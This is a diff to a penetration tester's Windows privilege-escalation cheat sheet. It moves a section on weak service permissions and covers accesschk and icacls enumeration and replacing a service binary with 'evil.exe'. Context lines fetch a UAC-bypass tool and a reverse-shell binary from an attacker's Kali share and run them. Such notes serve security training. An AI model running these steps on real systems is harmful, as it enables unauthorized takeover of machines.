@@ -674,11 +674,15 @@ Enumerate misconfigured service permissions
 
 Find running services we can write to (weak service permissions)
 ```powershell
-# Accesschk (faster)
+# Accesschk (fast)
 cmd> accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 cmd> accesschk.exe /accepteula -uwdqs Users c:\
 
-# tasklist (slower)
+# powershell (fast)
+PS> Get-Acl
+PS> Get-ChildItem | Get-Acl
+
+# tasklist (slow)
 cmd> tasklist /svc
 ```
 
@@ -702,6 +706,7 @@ SERVICE_NAME: MEmuSVC
         SERVICE_START_NAME : LocalSystem
 
 # check service permissions
+# reference: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753525(v=ws.10)?redirectedfrom=MSDN
 cmd> icacls/cacls "C:\Program Files\path\to\vulnservice.exe"
 ^LOOK FOR FULL (F) WRITE (W)
 cmd> accesschk.exe -ucqv vulnservice -accepteula
@@ -716,6 +721,8 @@ CHIMERA\steph:(I)(F)
 cmd> rename evil.exe vulnservice.exe
 cmd> move vulnservice.exe "C:\Program Files\path\to\vulnservice.exe"
 cmd> shutdown /r /t 0
+#OR
+cmd> sc qc VulnService restart
 ```
 
 ### Services - Unquoted Paths
@@ -782,24 +789,6 @@ STEP 3: Transfer, setup listener and exec payload
 cmd> copy \\[kali]\[share]\uac-bypass.exe uac-bypass.exe
 cmd> copy \\[kali]\[share]\rshell.exe rshell.exe
 cmd> .\uac-bypass.exe
-```
-
-### Insecure Service Permissions
-
-STEP 1: Check service permissions
-* Icacls output reference: https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753525(v=ws.10)?redirectedfrom=MSDN
-```
-# windows/winXP
-cmd> icacls/cacls [fullpath/to/service]
-
-# powershell
-PS> Get-Acl
-PS> Get-ChildItem | Get-Acl
-```
-
-STEP 2: Replace service binary with malicious binary and restart service.
-```
-cmd> sc qc [servicename] restart
 ```
 
 ### File & Folder Permissions
